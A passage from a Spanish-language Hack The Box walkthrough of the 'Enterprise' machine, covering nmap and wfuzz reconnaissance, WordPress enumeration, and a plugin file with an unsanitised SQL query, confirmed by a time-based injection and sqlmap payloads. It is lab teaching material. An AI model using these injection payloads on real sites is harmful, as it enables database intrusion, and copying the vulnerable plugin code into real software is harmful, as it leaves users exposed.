</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>enterprise.local/organizationName<span class=o>=</span>USS Enterprise/stateOrProvinceName<span class=o>=</span>United Federation of Planets/countryName<span class=o>=</span>UK
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2017-08-25T10:35:14
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2017-09-24T10:35:14
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class=line><span class=cl>8080/tcp  open  http     Apache httpd 2.4.10 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Home
</span></span><span class=line><span class=cl><span class=p>|</span>_http-generator: Joomla! - Open Source Content Management
</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.10 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>15</span> disallowed entries 
</span></span><span class=line><span class=cl><span class=p>|</span> /joomla/administrator/ /administrator/ /bin/ /cache/ 
</span></span><span class=line><span class=cl><span class=p>|</span> /cli/ /components/ /includes/ /installation/ /language/ 
</span></span><span class=line><span class=cl><span class=p>|</span>_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
</span></span><span class=line><span class=cl>32812/tcp open  unknown
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines, GetRequest, HTTPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     _______ _______ ______ _______
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=p>|</span>_____<span class=p>|</span> <span class=p>|</span>_____/ <span class=p>|</span>______
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=p>|</span>_____ <span class=p>|</span>_____ <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> _ ______<span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Welcome to the Library Computer Access and Retrieval System
</span></span><span class=line><span class=cl><span class=p>|</span>     Enter Bridge Access Code: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid Code
</span></span><span class=line><span class=cl><span class=p>|</span>     Terminating Console
</span></span><span class=line><span class=cl><span class=p>|</span>   NULL: 
</span></span><span class=line><span class=cl><span class=p>|</span>     _______ _______ ______ _______
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=p>|</span>_____<span class=p>|</span> <span class=p>|</span>_____/ <span class=p>|</span>______
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=p>|</span>_____ <span class=p>|</span>_____ <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> _ ______<span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Welcome to the Library Computer Access and Retrieval System
</span></span><span class=line><span class=cl><span class=p>|</span>_    Enter Bridge Access Code:
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port32812-TCP:V<span class=o>=</span>7.94%I<span class=o>=</span>7%D<span class=o>=</span>11/11%Time<span class=o>=</span>654FAA2C%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>
</span></span><span class=line><span class=cl>SF:NULL,ED,<span class=s2>&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Compu
</span></span></span><span class=line><span class=cl><span class=s2>SF:ter\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Acces
</span></span></span><span class=line><span class=cl><span class=s2>SF:s\x20Code:\x20\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>GenericLines,110,<span class=s2>&#34;\n\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\
</span></span></span><span class=line><span class=cl><span class=s2>SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syst
</span></span></span><span class=line><span class=cl><span class=s2>SF:em\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermin
</span></span></span><span class=line><span class=cl><span class=s2>SF:ating\x20Console\n\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>GetRequest,110,<span class=s2>&#34;\n\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20_____
</span></span></span><span class=line><span class=cl><span class=s2>SF:_\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|_____
</span></span></span><span class=line><span class=cl><span class=s2>SF:_\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sy
</span></span></span><span class=line><span class=cl><span class=s2>SF:stem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTerm
</span></span></span><span class=line><span class=cl><span class=s2>SF:inating\x20Console\n\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,110,<span class=s2>&#34;\n\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20__
</span></span></span><span class=line><span class=cl><span class=s2>SF:____\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|__
</span></span></span><span class=line><span class=cl><span class=s2>SF:____\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelco
</span></span></span><span class=line><span class=cl><span class=s2>SF:me\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nT
</span></span></span><span class=line><span class=cl><span class=s2>SF:erminating\x20Console\n\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table></details><br><h3 id=puerto-443>Puerto 443<a href=#puerto-443 class=anchor aria-hidden=true>#</a></h3><p>Nmap reporto que habi auna web corriendo por el puerto 443. Al entrar, esta web muestra la página default de apache en un ubuntu. Puede ser que exsistan otras rutas, asi que vamos a hacer fuzzing</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wfuzz -c -t <span class=m>20</span> --hc<span class=o>=</span><span class=m>404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.61/FUZZ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
</span></span><span class=line><span class=cl>ID           Response   Lines    Word       Chars       <span class=nv>Payload</span>                                                
</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>     
</span></span><span class=line><span class=cl>000000094:   <span class=m>301</span>        <span class=m>9</span> L      <span class=m>28</span> W       <span class=m>312</span> Ch      <span class=s2>&#34;files&#34;</span> 
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li>-c: Mostrar el resultado con colores</li><li>-t: Definir el tiempo del escaneo</li><li>&ndash;hc=404: Con esto le decimos que no nos interesan las respuestas cuyo codigo de estado sea 404, lo que significa que no queremos que nos reporte paginas que no exsisten</li><li>-w: Diccionario</li><li>FUZZ: Es donde va a ir probando el contenido del diccionario</li></ul></details><br><p>Wfuzz a reportado la exsistencia de un directorio llamado files. Al entrar se ve un archivo llamado <strong>lcars.zip</strong> que si lo odescargamos y descomprimimos vemos que contiene 3 archivos:</p><ul><li><p><strong>lcars.php</strong></p><p>Este archivo esta vacio, no contiene codigo php, pero si tiene unos comentarios que nos hacen pensar que es un plugin de alguna web. Podemos ver el nombre del plugin: <strong>lcars</strong>. El nombre del dominio: <strong>enterprise.htb</strong>. Y 3 comentarios: Need to create the user interface, need to finsih the db interface y need to make it secure. El ultimo comentario dice que &ldquo;lo tiene que hacer mas seguro&rdquo;, puede ser que el plugin sea vulnerable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>*     Plugin Name: lcars
</span></span></span><span class=line><span class=cl><span class=cm>*     Plugin URI: enterprise.htb
</span></span></span><span class=line><span class=cl><span class=cm>*     Description: Library Computer Access And Retrieval System
</span></span></span><span class=line><span class=cl><span class=cm>*     Author: Geordi La Forge
</span></span></span><span class=line><span class=cl><span class=cm>*     Version: 0.2
</span></span></span><span class=line><span class=cl><span class=cm>*     Author URI: enterprise.htb
</span></span></span><span class=line><span class=cl><span class=cm>*                             */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Need to create the user interface. 
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// need to finsih the db interface
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// need to make it secure
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></div></li><li><p><strong>lcars_dbpost.php</strong></p><p>Este archivo contiene codigo php, en el codigo se incluye el archivo <code>/var/www/html/wp-config.php</code> que seguramente es el que tiene las credenciales de la base de datos. Despues hace una petición a la base de datos <code>SELECT post_title FROM wp_posts WHERE ID = $query</code> en la cual se estan selecionando los &ldquo;post_title&rdquo; de la tabla wp_posts donde el id es igual a $query y $query equivale a lo que se manda por el metodo get en el parametro query. Antes de hacer la peticion convierte la data que se pasa por el parametro query a un int, un numero, lo que da a entender que esta esperando un numero, esto no tiene pinta de ser vulnerable ya que convierte a int la data que le pasamos.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>  <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;/var/www/html/wp-config.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=nx>DB_HOST</span><span class=p>,</span> <span class=nx>DB_USER</span><span class=p>,</span> <span class=nx>DB_PASSWORD</span><span class=p>,</span> <span class=nx>DB_NAME</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Test the connection:
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>mysqli_connect_errno</span><span class=p>()){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Connection Error
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t connect to the database: &#34;</span><span class=o>.</span><span class=nx>mysqli_connect_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// test to retireve a post name
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$query</span> <span class=o>=</span> <span class=p>(</span><span class=nx>int</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;SELECT post_title FROM wp_posts WHERE ID = </span><span class=si>$query</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$result</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$row</span> <span class=o>=</span> <span class=nv>$result</span><span class=o>-&gt;</span><span class=na>fetch_row</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=mi>0</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$row</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Failed to read query&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></div></li><li><p><strong>lcars_db.php</strong></p><p>Por ultimó el archivo lcars_db.php tambien contiene codigo php, en el codigo se vuelve a incluir el archivo <code>/var/www/html/wp-config.php</code> que como dije en el anterior, seguramente es el archivo que contiene las credenciales de la base de datos. Despues hace una petición a la base de datos en la cual seleciona los ID de la tabla &ldquo;wp_posts&rdquo; donde la columna &ldquo;post_name&rdquo; sea igual a $query. El script con $query se refiere a la data que le mandamos con el metodo GET por el parametro query <code>SELECT ID FROM wp_posts WHERE post_name = $query</code>. Este archivo cambia un poco ya que la peticion no es la misma y $query ya no es un numero. Al no convertir a int nuestro input, se pone directamente nuestro input en la petición, sin ningún tipo de sanitización, lo que parece que puede ser vulnerable a una SQLI</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;/var/www/html/wp-config.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=nx>DB_HOST</span><span class=p>,</span> <span class=nx>DB_USER</span><span class=p>,</span> <span class=nx>DB_PASSWORD</span><span class=p>,</span> <span class=nx>DB_NAME</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Test the connection:
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>mysqli_connect_errno</span><span class=p>()){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Connection Error
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t connect to the database: &#34;</span><span class=o>.</span><span class=nx>mysqli_connect_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// test to retireve an ID
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$query</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;SELECT ID FROM wp_posts WHERE post_name = </span><span class=si>$query</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Failed to read query&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div></li></ul><h3 id=enterprisehtb>enterprise.htb<a href=#enterprisehtb class=anchor aria-hidden=true>#</a></h3><p>En el primer archivo dentro de lcars se identifico un comentario en el cual ponia un dominio:</p><pre tabindex=0><code>Plugin URI: enterprise.htb
</code></pre><p>Para hacer que funcione el dominio hay que añadirlo en el <code>/etc/hosts</code> acompañado de la ip de la máquina víctima, para que nuestra máquina sepa a que estamos haciendo referencia cuando le hablamos del enterprise.htb.</p><pre tabindex=0><code>10.10.10.61 enterprise.htb
</code></pre><p>Una vez completado este paso ya podemos entrar a la web con el dominio. pero antes que nada vamos a hacer un whatweb para saber un poco mas de información sobre la web</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whatweb enterprise.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://enterprise.htb <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.10<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>wordpress@example.com<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Debian Linux<span class=o>][</span>Apache/2.4.10 <span class=o>(</span>Debian<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.61<span class=o>]</span>, JQuery<span class=o>[</span>1.12.4<span class=o>]</span>, MetaGenerator<span class=o>[</span>WordPress 4.8.1<span class=o>]</span>, PHP<span class=o>[</span>5.6.31<span class=o>]</span>, PoweredBy<span class=o>[</span>WordPress<span class=o>]</span>, Script<span class=o>[</span>text/javascript<span class=o>]</span>, Title<span class=o>[</span>USS Enterprise <span class=p>&amp;</span><span class=c1>#8211; Ships Log], UncommonHeaders[link], WordPress[4.8.1], X-Powered-By[PHP/5.6.31]</span>
</span></span></code></pre></div><p>Del resultado del whatweb podemos ver que es un <strong>Wordpress</strong> de versión 4.8.1 (versión bastante desactualizada)</p><p>Sabiendo que es un wordpress podemos usar la herramienta wpscan para enumerar usuarios.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wpscan --url<span class=o>=</span>http://enterprise.htb -e u
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> User<span class=o>(</span>s<span class=o>)</span> Identified:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> william.riker
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Author Posts - Display Name <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Confirmed By:
</span></span><span class=line><span class=cl> <span class=p>|</span>  Rss Generator <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>  Login Error Messages <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> william-riker
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Author Id Brute Forcing - Author Pattern <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span></code></pre></div><p>A encontrado 2 possibles usuarios <strong>william.riker</strong> y <strong>william-riker</strong>, basicamente són el mismo usuario pero en partes distintas de la web por lo que esta escrito de distinta forma, debajo de william.riker pone Login Error Messages asi que vamos a suponer que el usuaqrio es william-riker</p><h2 id=explotación-sqli>Explotación SQLI<a href=#explotación-sqli class=anchor aria-hidden=true>#</a></h2><p>Ahora podriamos probar de ver si el plugin que se mencionaba en la otra web esta instalado en este wordpress, para saberlo sin estar autenticados vamos a hacer lo siguiente: Los plugins en wordpress suelen estar en wp-content/plugins/ asi que lo que pode mos hacer es intentar entrar en la carpeta wp-content/plugins/lcars que deberia ser la carpeta del plugin ya que se llama lcars. si hacemos un curl en la carpeta nos responde con un codigo 403 Lo que significa forbidden</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -o /dev/null -s -w <span class=s2>&#34;%{http_code}\n&#34;</span> enterprise.htb/wp-content/plugins/lcars/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>403</span>
</span></span></code></pre></div><p>Pero si hacemos la misma petición a un servidor random, nos devuelve un codigo 404, Not Found</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -o /dev/null -s -w <span class=s2>&#34;%{http_code}\n&#34;</span> enterprise.htb/wp-content/plugins/testing/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>404</span>
</span></span></code></pre></div><p>Con estos dos comandos podemos sacar la conclusión de que si exsiste una carpeta llamada lcars pero no tenemos permisos para ver el contenido que hay en ella, pero juagmos con ventaja ya que hemos visto el codigo del plugin y ya sabemos que archivos puede haber y cual puede ser vulnerable.</p><p>Vamos a probar de ver con curl si existe el archivo lcars_db.php que habiamos visto anteriormente que parecia que podia ser vulnerable a SQLI</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Failed to <span class=nb>read</span> query
</span></span></code></pre></div><p>Si recordamos, le podiamos mandar cosas por el metodo GET con el parametro query</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test&#34;</span>
</span></span><span class=line><span class=cl> 
</span></span></code></pre></div><p>Pero no responde con nada. Vamos a probar de añadir una inyeccion sql que lo que va a hacer es que la peticion tarde 5 segundos en procesarse <code>1 and sleep(5)</code>, esto lo vamos a juntar con el comando de curl url encodeado y el comando time para que nos diga cuanto tiempo tarda en ejecutarse el comando. (Para url encodear el payload de la SQLI se puede hacer con una web o manualmente cambiando los espacios por %20 y los &ldquo;()&rdquo; por %28 y %29)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>time</span> curl <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20and%20sleep%285%29&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;b&gt;Catchable fatal error&lt;/b&gt;:  Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	6.71s
</span></span><span class=line><span class=cl>user	0.00s
</span></span><span class=line><span class=cl>sys	0.01s
</span></span><span class=line><span class=cl>cpu	0%
</span></span></code></pre></div><p>Confirmado, es vulnerable, le dijimos a la base de datos que hiciera un sleep de <strong>5</strong> segundos y la peticion a tardado en llegar <strong>6.71</strong>, lo que significa que a funcionado</p><p>Para automatizar la inyección vamos a usar la herramienta <strong>sqlmap</strong>, sqlmap es una herramienta que en algunas certificaciones como OSCP esta prohibida, pero para esta máquina va muy bien, ya que haciendolo manual tardariamos mucho, muchisimo!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap --url <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#34;</span> --batch
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Parameter: query <span class=o>(</span>GET<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: boolean-based blind
</span></span><span class=line><span class=cl>    Title: Boolean-based blind - Parameter replace <span class=o>(</span>original value<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>query</span><span class=o>=(</span>SELECT <span class=o>(</span>CASE WHEN <span class=o>(</span><span class=nv>9063</span><span class=o>=</span>9063<span class=o>)</span> THEN <span class=m>1</span> ELSE <span class=o>(</span>SELECT <span class=m>3395</span> UNION SELECT 7761<span class=o>)</span> END<span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Type: error-based
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class=o>(</span>FLOOR<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>query</span><span class=o>=</span><span class=m>1</span> AND <span class=o>(</span>SELECT <span class=m>6881</span> FROM<span class=o>(</span>SELECT COUNT<span class=o>(</span>*<span class=o>)</span>,CONCAT<span class=o>(</span>0x71766b7171,<span class=o>(</span>SELECT <span class=o>(</span>ELT<span class=o>(</span><span class=nv>6881</span><span class=o>=</span>6881,1<span class=o>)))</span>,0x71706a7671,FLOOR<span class=o>(</span>RAND<span class=o>(</span>0<span class=o>)</span>*2<span class=o>))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class=o>)</span>a<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>query</span><span class=o>=</span><span class=m>1</span> AND <span class=o>(</span>SELECT <span class=m>1921</span> FROM <span class=o>(</span>SELECT<span class=o>(</span>SLEEP<span class=o>(</span>5<span class=o>)))</span>CmQp<span class=o>)</span>
